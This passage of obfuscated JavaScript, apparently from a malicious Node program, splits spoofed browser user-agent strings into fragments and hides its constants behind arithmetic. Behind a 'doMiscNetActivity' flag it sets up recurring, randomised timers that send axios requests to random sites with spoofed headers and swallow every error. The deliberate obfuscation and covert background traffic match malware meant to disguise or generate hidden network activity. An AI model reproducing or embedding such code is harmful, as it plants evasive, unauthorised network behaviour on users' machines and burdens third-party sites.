      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x80 * -0x31 + -0x3c * -0xc + -0x10 * -0x15b; k < -0x25ed + -0xa * 0x173 + 0x346f; k++)
    setTimeout(f, (0x14ac3 + 0x17a4 * -0x11 + -0x18d * -0xc5) * k * getRandomInt(-0x13b9 + 0x824 + -0x2 * -0x5cb, 0x46d + -0xe2 + -0x388));
  setInterval(() => {
    f();
    for (let l = 0x5 * -0x175 + -0x9 * 0x29b + 0x464 * 0x7; l < 0x185 * 0xb + 0xaf9 * -0x2 + 0x1 * 0x53f; l++)
      setTimeout(f, (-0x14e43 + 0x3d0e + 0x1fb95 * 0x1) * l * getRandomInt(-0x61 * 0xb + -0x19 * -0x17e + 0x1091 * -0x2, 0x1d9a + 0x1 * 0x112c + -0x1 * 0x2ec3));
  }, -0x264193 + -0x75 * 0x6646 + 0x8bee11);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x31 * -0x1f + 0x7c1 * -0x7 + -0x12ec * -0x4) * getRandomInt(-0x1262 * 0x1 + -0x5 * -0x517 + -0x710, -0x3 * -0x1ff + 0x14a7 + -0x1a9f));
}, -0x2637 + -0x295 * 0x1 + -0x1 * -0x2930);